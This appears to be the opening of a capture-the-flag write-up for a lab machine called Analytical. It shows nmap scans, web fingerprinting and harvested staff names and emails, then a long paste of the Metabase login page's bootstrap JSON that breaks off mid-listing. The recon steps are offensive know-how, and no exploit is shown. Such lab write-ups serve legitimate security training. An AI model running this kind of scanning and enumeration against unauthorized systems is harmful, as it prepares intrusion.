
First I started with the recon phase, with NMAP

`sudo nmap -p- -sS -Pn -n --min-rate 5000 10.10.11.233 -oN allports`

I found the port 80 and 22 opened, so I did another scan 

`sudo nmap -sVC -p 22 80 10.10.11.233 -oN targeted`

And the information about the machine was this:
```
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to [http://analytical.htb/](http://analytical.htb/)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I googled the launchpad and I can observe that the OS ubuntu is "jammy"

```
###Launchpad:###

# openssh 1:8.9p1-3ubuntu0.4

ubuntu jammy
```


I needed to modify the /etc/host file and add 
analytical.htb and I was able to see the website

##### WHATWEB ######

What web gives me this
```
[http://10.10.11.233](http://10.10.11.233) [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], RedirectLocation[[http://analytical.htb/](http://analytical.htb/)], Title[302 Found], nginx[1.18.0]

[http://analytical.htb/](http://analytical.htb/) [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]
```





#### Wappalizer ####

This was the technologies working on this machine
```
Font awesome4.0.3

MISCELLANEUS
Popper

WEB SERVERS
Nginx1.18.0

OPERATING SYSTEMS
Ubuntu

CDN
Cloudflare
cdnjs

MAPS
Google Maps

JAVASCRIPT LIBRARIES
Swipper
jQuery UI1.12.1
jQuery Migrate3.0.1
OWL Carrousel
jQuery3.0.0
FancyBox2.1.5

REVERSE PROXIES
Ngnix 1.18.0

UI frameworks
Bootstrap4
```

#### On the website I watched some names too:

Jonnhy Smith Chief Data Officer

Alex Kirigo Data Engineer

Daniel Walker Data Analyst

#### I found some mails too:

MAILS
demo@analytical.com
due@analytical.com




I found on the login a redirect to another site called data.analytical.htb and I had to add it on the /etc/hosts



The name of this site was "metabase"


### Source code of metabase

This was a obfuscated code but with HTML prettify online (just search it on google) I was able to see it better

```
<!doctype html>

<html lang="en" translate="no">

<head>

<meta charset="utf-8" />

<meta http-equiv="X-UA-Compatible" content="IE=edge" />

<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />

<meta name="robots" content="noindex" />

<meta name="apple-mobile-web-app-capable" content="yes" />

<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />

<link rel="apple-touch-icon" sizes="180x180" href="app/assets/img/apple-touch-icon.png">

<link rel="icon" href="app/assets/img/favicon.ico" />

<link rel="manifest" crossorigin="use-credentials" href="app/assets/img/site.webmanifest">

<meta name="msapplication-TileColor" content="#2d89ef">

<meta name="msapplication-config" content="app/assets/img/browserconfig.xml">

<meta name="theme-color" content="#ffffff">

<meta name="apple-mobile-web-app-status-bar-style" content="default" />

<meta name="base-href" content="/" />

<meta name="uri" content="/" />

<title>Metabase</title>

<base href="/" />

<script type="application/json" id="_metabaseBootstrap">

{

"engines": {

"postgres": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "name.database.com"

}, {

"name": "port",

"display-name": "Port",

"type": "integer",

"placeholder": 5432

}, {

"name": "dbname",

"display-name": "Database name",

"placeholder": "birds_of_the_world",

"required": true

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": true

}, {

"name": "password",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••"

}, {

"name": "schema-filters-type",

"display-name": "Schemas",

"type": "select",

"options": [{

"name": "All",

"value": "all"

}, {

"name": "Only these...",

"value": "inclusion"

}, {

"name": "All except...",

"value": "exclusion"

}],

"default": "all"

}, {

"name": "schema-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of schemas that should appear in Metabase",

"visible-if": {

"schema-filters-type": "inclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple schemas",

"required": true

}, {

"name": "schema-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of schemas that should NOT appear in Metabase",

"visible-if": {

"schema-filters-type": "exclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple schemas",

"required": true

}, {

"name": "ssl",

"display-name": "Use a secure connection (SSL)",

"type": "boolean",

"default": false

}, {

"name": "ssl-mode",

"display-name": "SSL Mode",

"type": "select",

"options": [{

"name": "allow",

"value": "allow"

}, {

"name": "prefer",

"value": "prefer"

}, {

"name": "require",

"value": "require"

}, {

"name": "verify-ca",

"value": "verify-ca"

}, {

"name": "verify-full",

"value": "verify-full"

}],

"default": "require",

"visible-if": {

"ssl": true

}

}, {

"name": "ssl-root-cert-options",

"display-name": "SSL Root Certificate (PEM)",

"type": "select",

"options": [{

"name": "Local file path",

"value": "local"

}, {

"name": "Uploaded file path",

"value": "uploaded"

}],

"default": "local",

"visible-if": {

"ssl": true,

"ssl-mode": ["verify-ca", "verify-full"]

}

}, {

"name": "ssl-root-cert-value",

"type": "textFile",

"treat-before-posting": "base64",

"visible-if": {

"ssl": true,

"ssl-mode": ["verify-ca", "verify-full"],

"ssl-root-cert-options": "uploaded"

}

}, {

"name": "ssl-root-cert-path",

"type": "string",

"display-name": "File path",

"placeholder": null,

"visible-if": {

"ssl": true,

"ssl-mode": ["verify-ca", "verify-full"],

"ssl-root-cert-options": "local"

}

}, {

"name": "ssl-use-client-auth",

"display-name": "Authenticate client certificate?",

"type": "boolean",

"visible-if": {

"ssl": true

}

}, {

"name": "ssl-client-cert-options",

"display-name": "SSL Client Certificate (PEM)",

"type": "select",

"options": [{

"name": "Local file path",

"value": "local"

}, {

"name": "Uploaded file path",

"value": "uploaded"

}],

"default": "local",

"visible-if": {

"ssl": true,

"ssl-use-client-auth": true

}

}, {

"name": "ssl-client-cert-value",

"type": "textFile",

"treat-before-posting": "base64",

"visible-if": {

"ssl": true,

"ssl-use-client-auth": true,

"ssl-client-cert-options": "uploaded"

}

}, {

"name": "ssl-client-cert-path",

"type": "string",

"display-name": "File path",

"placeholder": null,

"visible-if": {

"ssl": true,

"ssl-use-client-auth": true,

"ssl-client-cert-options": "local"

}

}, {

"name": "ssl-key-options",

"display-name": "SSL Client Key (PKCS-8/DER)",

"type": "select",

"options": [{

"name": "Local file path",

"value": "local"

}, {

"name": "Uploaded file path",

"value": "uploaded"

}],

"default": "local",

"visible-if": {

"ssl": true,

"ssl-use-client-auth": true

}

}, {

"name": "ssl-key-value",

"type": "textFile",

"treat-before-posting": "base64",

"visible-if": {

"ssl": true,

"ssl-use-client-auth": true,

"ssl-key-options": "uploaded"

}

}, {

"name": "ssl-key-path",

"type": "string",

"display-name": "File path",

"placeholder": null,

"visible-if": {

"ssl": true,

"ssl-use-client-auth": true,

"ssl-key-options": "local"

}

}, {

"name": "ssl-key-password-value",

"display-name": "SSL Client Key Password",

"type": "password",

"visible-if": {

"ssl": true,

"ssl-use-client-auth": true

}

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "json-unfolding",

"display-name": "Unfold JSON Columns",

"type": "boolean",

"visible-if": {

"advanced-options": true

},

"description": "We unfold JSON columns into component fields.This is on by default but you can turn it off if performance is slow.",

"default": true

}, {

"name": "additional-options",

"display-name": "Additional JDBC connection string options",

"visible-if": {

"advanced-options": true

},

"placeholder": "prepareThreshold=0"

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "PostgreSQL",

"superseded-by": null

},

"googleanalytics": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "account-id",

"display-name": "Google Analytics Account ID",

"helper-text": "You can find the Account ID in Google Analytics → Admin → Account Settings.",

"placeholder": "1234567",

"required": true

}, {

"name": "service-account-json",

"display-name": "Service account JSON file",

"helper-text": "This JSON file contains the credentials Metabase needs to read and query your dataset.",

"required": true,

"type": "textFile"

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "Google Analytics (Deprecated driver)",

"superseded-by": null

},

"sparksql": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "name.database.com"

}, {

"name": "port",

"display-name": "Port",

"type": "integer",

"default": 10000

}, {

"name": "dbname",

"display-name": "Database name",

"placeholder": "default",

"required": true

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": true

}, {

"name": "password",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••"

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "jdbc-flags",

"display-name": "Additional JDBC connection string options",

"visible-if": {

"advanced-options": true

},

"placeholder": ";transportMode=http"

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "Spark SQL",

"superseded-by": null

},

"mongo": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "use-conn-uri",

"type": "section",

"default": false

}, {

"name": "conn-uri",

"type": "string",

"display-name": "Paste your connection string",

"placeholder": "mongodb://[username:password@]host1[:port1][,...hostN[:portN]][/[dbname][?options]]",

"required": true,

"visible-if": {

"use-conn-uri": true

}

}, {

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "name.database.com",

"visible-if": {

"use-conn-uri": false

}

}, {

"name": "dbname",

"display-name": "Database name",

"placeholder": "birds_of_the_world",

"required": true,

"visible-if": {

"use-conn-uri": false

}

}, {

"name": "port",

"display-name": "Port",

"type": "integer",

"default": 27017,

"visible-if": {

"use-conn-uri": false

}

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": false,

"visible-if": {

"use-conn-uri": false

}

}, {

"name": "pass",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••",

"visible-if": {

"use-conn-uri": false

}

}, {

"name": "authdb",

"display-name": "Authentication database (optional)",

"placeholder": "admin",

"visible-if": {

"use-conn-uri": false

}

}, {

"name": "ssl",

"display-name": "Use a secure connection (SSL)",

"type": "boolean",

"default": false,

"visible-if": {

"use-conn-uri": false

}

}, {

"name": "ssl-cert",

"type": "string",

"display-name": "Server SSL certificate chain (PEM)",

"visible-if": {

"use-conn-uri": false,

"ssl": true

}

}, {

"name": "ssl-use-client-auth",

"display-name": "Authenticate client certificate?",

"type": "boolean",

"visible-if": {

"use-conn-uri": false,

"ssl": true

}

}, {

"name": "client-ssl-cert",

"display-name": "Client SSL certificate chain (PEM)",

"placeholder": "Paste the contents of the client's SSL certificate chain here",

"type": "text",

"visible-if": {

"use-conn-uri": false,

"ssl": true,

"ssl-use-client-auth": true

}

}, {

"name": "client-ssl-key-options",

"display-name": "Client SSL private key (PEM)",

"type": "select",

"options": [{

"name": "Local file path",

"value": "local"

}, {

"name": "Uploaded file path",

"value": "uploaded"

}],

"default": "local",

"visible-if": {

"use-conn-uri": false,

"ssl": true,

"ssl-use-client-auth": true

}

}, {

"name": "client-ssl-key-value",

"type": "textFile",

"treat-before-posting": "base64",

"visible-if": {

"use-conn-uri": false,

"ssl": true,

"ssl-use-client-auth": true,

"client-ssl-key-options": "uploaded"

}

}, {

"name": "client-ssl-key-path",

"type": "string",

"display-name": "File path",

"placeholder": null,

"visible-if": {

"use-conn-uri": false,

"ssl": true,

"ssl-use-client-auth": true,

"client-ssl-key-options": "local"

}

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "additional-options",

"display-name": "Additional connection string options (optional)",

"visible-if": {

"use-conn-uri": false

},

"placeholder": "retryWrites=true&w=majority&authSource=admin&readPreference=nearest&replicaSet=test"

}, {

"name": "use-srv",

"type": "boolean",

"default": false,

"visible-if": {

"use-conn-uri": false,

"advanced-options": true

}

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "MongoDB",

"superseded-by": null

},

"druid": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "name.database.com",

"default": "[http://localhost](http://localhost)"

}, {

"name": "port",

"display-name": "Broker node port",

"type": "integer",

"default": 8082

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "Druid",

"superseded-by": null

},

"redshift": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "my-cluster-name.abcd1234.us-east-1.redshift.amazonaws.com"

}, {

"name": "port",

"display-name": "Port",

"type": "integer",

"default": 5439

}, {

"name": "db",

"display-name": "Database name",

"placeholder": "birds_of_the_world",

"required": true

}, {

"name": "schema-filters-type",

"display-name": "Schemas",

"type": "select",

"options": [{

"name": "All",

"value": "all"

}, {

"name": "Only these...",

"value": "inclusion"

}, {

"name": "All except...",

"value": "exclusion"

}],

"default": "all"

}, {

"name": "schema-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of schemas that should appear in Metabase",

"visible-if": {

"schema-filters-type": "inclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple schemas",

"required": true

}, {

"name": "schema-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of schemas that should NOT appear in Metabase",

"visible-if": {

"schema-filters-type": "exclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple schemas",

"required": true

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": true

}, {

"name": "password",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••"

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "additional-options",

"display-name": "Additional JDBC connection string options",

"visible-if": {

"advanced-options": true

},

"placeholder": "SocketTimeout=0"

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "Amazon Redshift",

"superseded-by": null

},

"bigquery-cloud-sdk": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "project-id",

"display-name": "Project ID (override)",

"helper-text": "Project ID to be used for authentication. You can omit this field if you are only querying datasets owned by your organization.",

"required": false,

